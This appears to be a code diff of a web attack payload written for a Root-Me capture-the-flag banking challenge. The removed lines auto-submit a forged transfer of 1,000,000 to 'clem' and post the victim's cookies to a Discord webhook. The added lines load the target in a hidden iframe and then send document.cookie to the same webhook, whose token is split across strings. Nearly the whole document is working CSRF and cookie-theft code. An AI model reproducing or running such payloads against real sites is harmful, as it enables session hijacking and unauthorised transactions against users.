@@ -1,27 +1,15 @@
-<form action="https://bankme-0.challenges.pro.root-me.org/transfer" method="post">
-  <input name="recipient" value="clem">
-  <input name="amount" value="1000000">
-  <button type="submit">Send</button>
-</form>
-
+<iframe style="display:none;" id="iframe" name="iframe" src="https://bankme-0.challenges.pro.root-me.org/"></iframe>
 <script>
-  // Replace with your actual Discord webhook URL
-  const discordWebhookURL = 'https://discord.com/api/webhooks/1362229098960781342/ez8jZMtgBIaB' + 'Qwhx7MdSCvMX3b4upWWFMVW5K9EbjO1vgqeXgLuNye5SPSEo-wIGzoyL';
-
-  // Prepare the message data to send to Discord
-  const payload = {
-    content: `Stolen Cookies: ${document.cookie}` // Send the cookies in the content field
+  document.getElementById('iframe').onload = function() {
+    fetch('https://discord.com/api/webhooks/1362229098960781342/ez' + '8jZMtgBIaBQwhx7MdSCvMX3b4upWWFMVW5K9EbjO1vgqeXgLuNye5SPSEo-wIGzoyL', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        content: `Cookies: ${document.cookie}`
+      }),
+    });
   };
 
-  // Send the stolen cookies to the Discord webhook using a POST request
-  fetch(discordWebhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(payload),
-  });
-
-  // Automatically submit the form (transaction will happen here)
-  document.forms[0].submit();
 </script>
